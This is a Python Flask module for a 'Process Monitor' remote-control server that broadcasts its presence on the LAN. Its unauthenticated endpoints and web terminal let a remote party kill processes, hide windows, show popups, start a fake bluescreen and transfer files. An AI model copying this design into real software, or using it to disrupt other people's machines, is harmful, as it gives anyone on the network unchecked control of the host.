"""
HTTP API 服务器模块
提供 REST API 和 Web 终端，支持设备发现（UDP 广播）和文件传输
"""
import socket
import threading
import time
import json
import os
from werkzeug.utils import secure_filename
from flask import Flask, request, jsonify, render_template_string, send_file

app = Flask(__name__)
callbacks = {}

_http_server = None
_discovery_port = 5001
broadcast_interval = 10

# 全局设备发现字典
discovered_devices = {}

# 文件接收目录（默认在程序所在目录下的 received_files，可通过配置修改）
RECEIVE_DIR = None

def set_receive_dir(path):
    """设置文件接收目录，由主控制器调用"""
    global RECEIVE_DIR
    RECEIVE_DIR = path
    os.makedirs(RECEIVE_DIR, exist_ok=True)

def get_receive_dir():
    return RECEIVE_DIR

def register_callback(name, func):
    callbacks[name] = func

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def broadcast_presence(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    message = json.dumps({"ip": get_local_ip(), "http_port": port})
    while True:
        try:
            sock.sendto(message.encode(), ('255.255.255.255', _discovery_port))
        except:
            pass
        time.sleep(broadcast_interval)

def listen_for_devices():
    global discovered_devices
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', _discovery_port))
    while True:
        try:
            data, addr = sock.recvfrom(1024)
            info = json.loads(data.decode())
            ip = info['ip']
            port = info['http_port']
            discovered_devices[ip] = {'port': port, 'last_seen': time.time()}
            for ip in list(discovered_devices.keys()):
                if time.time() - discovered_devices[ip]['last_seen'] > 30:
                    del discovered_devices[ip]
        except:
            pass

def start_discovery(http_port, discovery_port):
    global _discovery_port
    _discovery_port = discovery_port
    threading.Thread(target=listen_for_devices, daemon=True).start()
    threading.Thread(target=broadcast_presence, args=(http_port,), daemon=True).start()

def stop_http_server():
    global _http_server
    if _http_server:
        _http_server.shutdown()
        _http_server = None

def start_http_server(port=5000, discovery_port=5001):
    global _http_server
    start_discovery(port, discovery_port)
    from werkzeug.serving import make_server
    _http_server = make_server('0.0.0.0', port, app)
    threading.Thread(target=_http_server.serve_forever, daemon=True).start()

# ---------- API 端点 ----------
@app.route('/api/hide_all', methods=['POST'])
def api_hide_all():
    if 'hide_all' in callbacks:
        callbacks['hide_all']()
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'not implemented'}), 404

@app.route('/api/show_all', methods=['POST'])
def api_show_all():
    if 'show_all' in callbacks:
        callbacks['show_all']()
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'not implemented'}), 404

@app.route('/api/kill/<int:pid>', methods=['POST'])
def api_kill(pid):
    if 'kill_process' in callbacks:
        success = callbacks['kill_process'](pid)
        return jsonify({'status': 'ok', 'success': success})
    return jsonify({'error': 'not implemented'}), 404

@app.route('/api/list', methods=['GET'])
def api_list():
    if 'list_processes' in callbacks:
        procs = callbacks['list_processes']()
        return jsonify(procs)
    return jsonify({'error': 'not implemented'}), 404

@app.route('/api/hide/<int:pid>', methods=['POST'])
def api_hide(pid):
    if 'hide_process' in callbacks:
        success = callbacks['hide_process'](pid)
        return jsonify({'status': 'ok', 'success': success})
    return jsonify({'error': 'not implemented'}), 404

@app.route('/api/show/<int:pid>', methods=['POST'])
def api_show(pid):
    if 'show_process' in callbacks:
        success = callbacks['show_process'](pid)
        return jsonify({'status': 'ok', 'success': success})
    return jsonify({'error': 'not implemented'}), 404

@app.route('/api/toggle/<int:pid>', methods=['POST'])
def api_toggle(pid):
    if 'toggle_process' in callbacks:
        success = callbacks['toggle_process'](pid)
        return jsonify({'status': 'ok', 'success': success})
    return jsonify({'error': 'not implemented'}), 404

@app.route('/api/add/<int:pid>', methods=['POST'])
def api_add(pid):
    if 'add_pid' in callbacks:
        callbacks['add_pid'](pid)
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'not implemented'}), 404

@app.route('/api/send_message', methods=['POST'])
def api_send_message():
    data = request.get_json()
    message = data.get('message', '')
    if 'show_message' in callbacks:
        callbacks['show_message'](message)
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'not implemented'}), 404

# 文件上传端点（接收其他设备发送的文件）
@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    filename = secure_filename(file.filename)
    save_dir = get_receive_dir()
    if not save_dir:
        return jsonify({'error': 'Receive directory not configured'}), 500
    save_path = os.path.join(save_dir, filename)
    # 避免重名覆盖
    counter = 1
    while os.path.exists(save_path):
        name, ext = os.path.splitext(filename)
        save_path = os.path.join(save_dir, f"{name}_{counter}{ext}")
        counter += 1
    file.save(save_path)
    # 回调通知主程序（弹窗）
    if 'on_file_received' in callbacks:
        callbacks['on_file_received'](filename, save_path)
    return jsonify({'status': 'ok', 'saved_as': os.path.basename(save_path)})

# 文件下载端点（可选，供其他设备主动拉取）
@app.route('/api/download/<filename>', methods=['GET'])
def download_file(filename):
    safe_name = secure_filename(filename)
    file_path = os.path.join(get_receive_dir(), safe_name)
    if not os.path.exists(file_path):
        return jsonify({'error': 'File not found'}), 404
    return send_file(file_path, as_attachment=True)

# ---------- Web 终端 ----------
TERMINAL_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Process Monitor Terminal</title>
    <style>
        body {
            background-color: black;
            color: #0f0;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        #terminal {
            background-color: black;
            border: 1px solid #0f0;
            padding: 10px;
            height: 80vh;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        .input-line {
            display: flex;
            margin-top: 10px;
        }
        .prompt {
            color: #0f0;
            margin-right: 10px;
        }
        #command-input {
            background-color: black;
            color: #0f0;
            border: none;
            outline: none;
            flex: 1;
            font-family: 'Courier New', monospace;
            font-size: 1em;
        }
        .output {
            margin-bottom: 5px;
        }
        .error {
            color: #f00;
        }
    </style>
</head>
<body>
    <div id="terminal"></div>
    <div class="input-line">
        <span class="prompt">$></span>
        <input type="text" id="command-input" autofocus>
    </div>
    <script>
        const terminal = document.getElementById('terminal');
        const input = document.getElementById('command-input');
        let history = [];
        let historyIndex = -1;

        function appendOutput(text, isError = false) {
            const div = document.createElement('div');
            div.className = 'output';
            if (isError) div.classList.add('error');
            div.textContent = text;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        async function executeCommand(cmd) {
            if (!cmd.trim()) return;
            appendOutput(`$> ${cmd}`);
            try {
                const response = await fetch('/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cmd: cmd })
                });
                const data = await response.json();
                if (data.error) {
                    appendOutput(data.error, true);
                } else {
                    appendOutput(data.output);
                }
            } catch (err) {
                appendOutput(`Error: ${err.message}`, true);
            }
        }

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const cmd = input.value;
                if (cmd) {
                    history.push(cmd);
                    historyIndex = history.length;
                    executeCommand(cmd);
                }
                input.value = '';
                e.preventDefault();
            } else if (e.key === 'ArrowUp') {
                if (historyIndex > 0) {
                    historyIndex--;
                    input.value = history[historyIndex];
                }
                e.preventDefault();
            } else if (e.key === 'ArrowDown') {
                if (historyIndex < history.length - 1) {
                    historyIndex++;
                    input.value = history[historyIndex];
                } else if (historyIndex === history.length - 1) {
                    historyIndex = history.length;
                    input.value = '';
                }
                e.preventDefault();
            }
        });

        appendOutput('Process Monitor Terminal 1.0');
        appendOutput('可用命令: list, add <PID>, hide, hide <PID>, show, show <PID>, kill <PID>, send <message>, bs t, bs f, help');
        appendOutput('输入 help 查看帮助');
        input.focus();
    </script>
</body>
</html>
'''

@app.route('/')
def terminal():
    return render_template_string(TERMINAL_HTML)

@app.route('/command', methods=['POST'])
def handle_command():
    data = request.get_json()
    cmd_str = data.get('cmd', '').strip()
    if not cmd_str:
        return jsonify({'error': 'Empty command'}), 400

    parts = cmd_str.split()
    command = parts[0].lower()
    args = parts[1:]

    if command == 'list':
        if 'list_processes' not in callbacks:
            return jsonify({'error': 'Not implemented'}), 404
        procs = callbacks['list_processes']()
        app_procs = [p for p in procs if p.get('category') == '应用']
        bg_procs = [p for p in procs if p.get('category') == '后台']
        lines = ["应用进程:"]
        lines.append(f"{'PID':<8} {'名称'}")
        lines.append('-' * 40)
        for p in app_procs[:50]:
            lines.append(f"{p['pid']:<8} {p['name']}")
        lines.append("\n后台进程:")
        lines.append(f"{'PID':<8} {'名称'}")
        lines.append('-' * 40)
        for p in bg_procs[:50]:
            lines.append(f"{p['pid']:<8} {p['name']}")
        if len(procs) > 100:
            lines.append(f"... 共 {len(procs)} 个进程，仅显示前100个")
        output = '\n'.join(lines)
        return jsonify({'output': output})

    elif command == 'add':
        if len(args) != 1:
            return jsonify({'error': '用法: add <PID>'}), 400
        try:
            pid = int(args[0])
        except ValueError:
            return jsonify({'error': 'PID必须是数字'}), 400
        if 'add_pid' not in callbacks:
            return jsonify({'error': 'Not implemented'}), 404
        callbacks['add_pid'](pid)
        return jsonify({'output': f'已添加进程 {pid} 到监控列表'})

    elif command == 'hide':
        if len(args) == 0:
            if 'hide_all' in callbacks:
                callbacks['hide_all']()
                return jsonify({'output': '已隐藏所有监控进程的窗口'})
        elif len(args) == 1:
            try:
                pid = int(args[0])
            except ValueError:
                return jsonify({'error': 'PID必须是数字'}), 400
            if 'hide_process' in callbacks:
                success = callbacks['hide_process'](pid)
                if success:
                    return jsonify({'output': f'已隐藏进程 {pid}'})
                else:
                    return jsonify({'output': f'隐藏进程 {pid} 失败（可能未监控或无权限）'})
        return jsonify({'error': '用法: hide 或 hide <PID>'}), 400

    elif command == 'show':
        if len(args) == 0:
            if 'show_all' in callbacks:
                callbacks['show_all']()
                return jsonify({'output': '已显示所有被隐藏的进程窗口'})
        elif len(args) == 1:
            try:
                pid = int(args[0])
            except ValueError:
                return jsonify({'error': 'PID必须是数字'}), 400
            if 'show_process' in callbacks:
                success = callbacks['show_process'](pid)
                if success:
                    return jsonify({'output': f'已显示进程 {pid}'})
                else:
                    return jsonify({'output': f'显示进程 {pid} 失败（可能未监控）'})
        return jsonify({'error': '用法: show 或 show <PID>'}), 400

    elif command == 'kill':
        if len(args) != 1:
            return jsonify({'error': '用法: kill <PID>'}), 400
        try:
            pid = int(args[0])
        except ValueError:
            return jsonify({'error': 'PID必须是数字'}), 400
        if 'kill_process' not in callbacks:
            return jsonify({'error': 'Not implemented'}), 404
        success = callbacks['kill_process'](pid)
        if success:
            return jsonify({'output': f'进程 {pid} 已结束'})
        else:
            return jsonify({'output': f'无法结束进程 {pid}（可能已不存在或无权限）'})

    elif command == 'send':
        if len(args) == 0:
            return jsonify({'error': '用法: send <message>'}), 400
        message = ' '.join(args)
        if 'show_message' in callbacks:
            callbacks['show_message'](message)
            return jsonify({'output': f'已发送消息: {message}'})
        return jsonify({'error': 'Not implemented'}), 404

    elif command == 'bs':
        if len(args) == 0:
            return jsonify({'error': '用法: bs t (启动蓝屏) 或 bs f (关闭蓝屏)'}), 400
        subcmd = args[0].lower()
        if subcmd == 't':
            if 'start_bluescreen' in callbacks:
                msg = callbacks['start_bluescreen']()
                return jsonify({'output': msg})
            else:
                return jsonify({'error': 'Not implemented'}), 404
        elif subcmd == 'f':
            if 'stop_bluescreen' in callbacks:
                msg = callbacks['stop_bluescreen']()
                return jsonify({'output': msg})
            else:
                return jsonify({'error': 'Not implemented'}), 404
        else:
            return jsonify({'error': '无效的子命令，使用 bs t 或 bs f'}), 400

    elif command == 'help':
        help_text = '''
可用命令:
  list                 - 列出应用进程和后台进程（分类显示）
  add <PID>            - 添加进程到监控列表
  hide                 - 隐藏所有监控进程
  hide <PID>           - 隐藏指定进程
  show                 - 显示所有被隐藏的进程
  show <PID>           - 显示指定进程
  kill <PID>           - 结束指定进程（及其子进程树）
  send <message>       - 向本机发送弹出消息
  bs t                 - 启动蓝屏程序
  bs f                 - 结束蓝屏程序
  help                 - 显示此帮助
        '''
        return jsonify({'output': help_text.strip()})

    else:
        return jsonify({'error': f'未知命令: {command}。输入 help 查看帮助'}), 400
